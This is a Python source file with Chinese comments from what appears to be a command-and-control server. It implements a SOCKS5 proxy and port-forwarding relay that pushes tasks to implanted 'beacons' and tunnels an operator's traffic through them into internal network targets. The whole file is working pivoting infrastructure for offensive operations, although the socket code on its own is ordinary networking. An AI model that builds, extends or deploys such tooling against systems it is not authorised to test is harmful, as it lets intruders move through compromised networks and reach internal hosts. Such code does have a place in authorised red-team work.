"""server/infra/relay.py — 中继通道（13/14）：socks5 动态代理 + 端口转发。

架构（按连接一条中继，任务驱动）：
  操作员 socks5/portfwd 连接 → server 登记 pending(conn_id) →
  下发 relay 任务给 beacon → beacon 下轮执行：连 server relay 端口
  (HELLO <conn_id>) → 连内网目标 → server 把两端配对双向转发。

socks5 目标 beacon = 当前 use 选中的 beacon；portfwd 显式指定。
"""

import socket
import struct
import threading
import time
import uuid

from server.task_queue import Task

_PENDING_TTL = 120.0  # pending 通道存活上限（S3：beacon 离线时清理）


def _bridge(a: socket.socket, b: socket.socket) -> None:
    """双向转发两条 socket（各自独立线程，读空即 shutdown 对端写）。"""
    def fwd(src, dst):
        try:
            while True:
                data = src.recv(65536)
                if not data:
                    break
                dst.sendall(data)
        except OSError:
            pass
        finally:
            try:
                dst.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            try:
                src.close()
            except OSError:
                pass

    threading.Thread(target=fwd, args=(a, b), daemon=True).start()
    fwd(b, a)


def _readline(conn: socket.socket, timeout: float = 15) -> bytes:
    conn.settimeout(timeout)
    buf = b""
    while b"\n" not in buf:
        chunk = conn.recv(1)
        if not chunk:
            break
        buf += chunk
    return buf


class RelayHub:
    """relay 通道管理：pending conn_id 等待 beacon 的 HELLO 后配对转发。"""

    def __init__(self, host: str, relay_port: int, tq, modules,
                 fallback_beacon):
        self._host = host
        self._port = relay_port
        self._tq = tq
        self._modules = modules
        self._fallback_beacon = fallback_beacon   # console dispatcher 兜底
        self._current = ""            # 共享选中 beacon（use 命令同步，S5）
        self._pending = {}            # conn_id -> (sock, beacon_id, ready, ts)
        self._lock = threading.Lock()
        self._running = False
        self._sock = None
        self._thread = None

    def set_current(self, beacon_id: str) -> None:
        """记录当前选中的 beacon（console/client use 命令同步，S5）。"""
        with self._lock:
            self._current = beacon_id

    def _get_current_beacon(self) -> str:
        """选中 beacon 解析：共享槽 > console dispatcher 兜底。"""
        if self._current:
            return self._current
        try:
            return self._fallback_beacon() or ""
        except Exception:
            return ""

    def _sweep_pending(self) -> None:
        """清理超时未配对的 pending 通道（S3）。"""
        now = time.time()
        with self._lock:
            stale = [cid for cid, item in self._pending.items()
                     if now - item[3] > _PENDING_TTL]
            for cid in stale:
                item = self._pending.pop(cid, None)
                if item:
                    try:
                        item[0].close()
                    except OSError:
                        pass

    def start(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._host, self._port))
        self._sock.listen(16)
        self._sock.settimeout(1.0)
        self._running = True
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    @property
    def port(self) -> int:
        return self._port

    def open_channel(self, beacon_id: str, client_sock: socket.socket,
                     target_host: str, target_port: int,
                     ready: "threading.Event" = None) -> str:
        """登记 pending 并下发 relay 任务给 beacon；返回 conn_id。

        Args:
            ready: 可选事件——socks5 用（响应帧发出后 set，保证 bridge
                在 SOCKS5 成功响应之后启动，S4）；portfwd 省略（立即就绪）。
        """
        self._sweep_pending()
        conn_id = uuid.uuid4().hex[:10]
        if ready is None:
            ready = threading.Event()
            ready.set()  # portfwd：无握手响应，立即就绪（S4）
        with self._lock:
            self._pending[conn_id] = (client_sock, beacon_id, ready,
                                      time.time())
        target = f"{target_host}:{target_port}"
        try:
            code = self._modules.build_task(
                "relay", conn_id=conn_id, relay_port=str(self._port),
                target=target)
        except (ValueError, KeyError) as e:
            with self._lock:
                self._pending.pop(conn_id, None)
            raise ValueError(f"relay 模块构建失败: {e}")
        task = Task(code=code)
        if not self._tq.push(beacon_id, task):
            # S3：队列满 → 任务未入队，回滚 pending，避免连接永久挂起
            with self._lock:
                self._pending.pop(conn_id, None)
            try:
                client_sock.close()
            except OSError:
                pass
            raise ValueError(f"beacon 任务队列已满: {beacon_id[:8]}...")
        return conn_id

    def _accept_loop(self) -> None:
        while self._running:
            try:
                conn, _ = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle_relay,
                             args=(conn,), daemon=True).start()

    def _handle_relay(self, conn: socket.socket) -> None:
        try:
            line = _readline(conn).decode("ascii", "replace").strip()
            if not line.startswith("HELLO "):
                conn.close()
                return
            conn_id = line.split()[1]
            with self._lock:
                item = self._pending.pop(conn_id, None)
            if item is None:
                conn.close()
                return
            client_sock, _, ready, _ = item
            # S4：等待 SOCKS5 成功响应发出后再开放桥接（portfwd 的
            # ready 立即置位），避免响应与目标数据交错
            try:
                ready.wait(timeout=10)
            except Exception:
                pass
            _bridge(client_sock, conn)
        except OSError:
            try:
                conn.close()
            except OSError:
                pass


def _recv_exactly(conn: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    return buf


def _handle_socks5(conn: socket.socket, hub: RelayHub) -> None:
    """SOCKS5 服务端握手（无认证）→ CONNECT → hub.open_channel。"""
    try:
        conn.settimeout(20)
        hdr = _recv_exactly(conn, 2)
        if hdr[0] != 0x05:
            conn.close()
            return
        conn.recv(hdr[1])          # 方法列表
        conn.sendall(b"\x05\x00")  # 无认证
        hdr = _recv_exactly(conn, 4)
        atyp = hdr[3]
        if atyp == 0x01:
            target_host = socket.inet_ntoa(_recv_exactly(conn, 4))
        elif atyp == 0x03:
            ln = _recv_exactly(conn, 1)[0]
            target_host = _recv_exactly(conn, ln).decode("ascii", "replace")
        elif atyp == 0x04:
            target_host = socket.inet_ntop(socket.AF_INET6,
                                           _recv_exactly(conn, 16))
        else:
            conn.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
            conn.close()
            return
        target_port = struct.unpack(">H", _recv_exactly(conn, 2))[0]

        bid = hub._get_current_beacon()
        if not bid:
            # 无选中 beacon：SOCKS5 拒绝（command not supported）
            conn.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
            conn.close()
            return
        try:
            ready = threading.Event()  # S4：成功响应发出后才置位
            hub.open_channel(bid, conn, target_host, target_port,
                             ready=ready)
        except ValueError:
            conn.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
            conn.close()
            return
        # 成功响应（后续数据由 hub 配对后转发）
        conn.sendall(b"\x05\x00\x00\x01" + b"\x00\x00\x00\x00" + b"\x00\x00")
        ready.set()
    except (OSError, ConnectionError):
        try:
            conn.close()
        except OSError:
            pass


class Socks5Server:
    """SOCKS5 监听（13）：每个连接一个处理线程。"""

    def __init__(self, host: str, port: int, hub: RelayHub):
        self._host = host
        self._port = port
        self._hub = hub
        self._running = False
        self._sock = None
        self._thread = None

    def start(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._host, self._port))
        self._sock.listen(16)
        self._sock.settimeout(1.0)
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def _loop(self) -> None:
        while self._running:
            try:
                conn, _ = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=_handle_socks5,
                             args=(conn, self._hub), daemon=True).start()
